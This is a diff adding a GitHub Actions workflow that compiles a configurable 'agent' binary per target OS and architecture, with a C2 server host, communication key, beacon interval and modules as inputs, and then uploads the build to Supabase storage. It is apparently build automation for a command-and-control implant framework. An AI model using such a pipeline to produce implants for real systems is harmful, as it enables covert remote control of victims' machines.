@@ -1,0 +1,100 @@
+name: Build Agent
+
+on:
+  workflow_dispatch:
+    inputs:
+      installer_id:
+        description: 'Installer ID in Supabase'
+        required: true
+        type: string
+      target_os:
+        description: 'Target OS'
+        required: true
+        type: choice
+        options: [windows, linux, darwin]
+      target_arch:
+        description: 'Target Architecture'
+        required: true
+        type: choice
+        options: [amd64, 386, arm64]
+      c2_host:
+        description: 'C2 Server Host'
+        required: true
+        type: string
+      communication_key:
+        description: 'Agent Communication Key'
+        required: true
+        type: string
+      sync_interval:
+        description: 'Sync Interval'
+        required: true
+        type: string
+      modules:
+        description: 'Enabled Modules (JSON)'
+        required: true
+        type: string
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.21'
+      
+      - name: Build Agent
+        run: |
+          cd builder
+          go run builder.go \
+            -c2 "${{ inputs.c2_host }}" \
+            -os "${{ inputs.target_os }}" \
+            -arch "${{ inputs.target_arch }}" \
+            -key "${{ inputs.communication_key }}" \
+            -sleep "${{ inputs.sync_interval }}s" \
+            -out "agent_${{ inputs.target_os }}_${{ inputs.target_arch }}"
+      
+      - name: Upload to Supabase Storage
+        env:
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
+        run: |
+          BINARY_PATH="builder/agent_${{ inputs.target_os }}_${{ inputs.target_arch }}"
+          if [ "${{ inputs.target_os }}" == "windows" ]; then
+            BINARY_PATH="${BINARY_PATH}.exe"
+          fi
+          
+          STORAGE_PATH="builds/${{ inputs.installer_id }}/$(basename $BINARY_PATH)"
+          FILE_SIZE=$(stat -f%z "$BINARY_PATH" 2>/dev/null || stat -c%s "$BINARY_PATH")
+          CHECKSUM=$(sha256sum "$BINARY_PATH" | cut -d' ' -f1)
+          
+          # Upload to Supabase Storage
+          curl -X POST "$SUPABASE_URL/storage/v1/object/installers/$STORAGE_PATH" \
+            -H "Authorization: Bearer $SUPABASE_SERVICE_KEY" \
+            -H "Content-Type: application/octet-stream" \
+            --data-binary @"$BINARY_PATH"
+          
+          # Call webhook to update status
+          curl -X POST "$SUPABASE_URL/functions/v1/build-complete" \
+            -H "Content-Type: application/json" \
+            -H "X-Webhook-Secret: ${{ secrets.BUILD_WEBHOOK_SECRET }}" \
+            -d "{
+              \"installer_id\": \"${{ inputs.installer_id }}\",
+              \"status\": \"completed\",
+              \"storage_path\": \"$STORAGE_PATH\",
+              \"file_size\": $FILE_SIZE,
+              \"checksum\": \"$CHECKSUM\"
+            }"
+      
+      - name: Handle Failure
+        if: failure()
+        run: |
+          curl -X POST "${{ secrets.SUPABASE_URL }}/functions/v1/build-complete" \
+            -H "Content-Type: application/json" \
+            -H "X-Webhook-Secret: ${{ secrets.BUILD_WEBHOOK_SECRET }}" \
+            -d "{
+              \"installer_id\": \"${{ inputs.installer_id }}\",
+              \"status\": \"failed\",
+              \"error\": \"Build failed - check GitHub Actions logs\"
+            }"
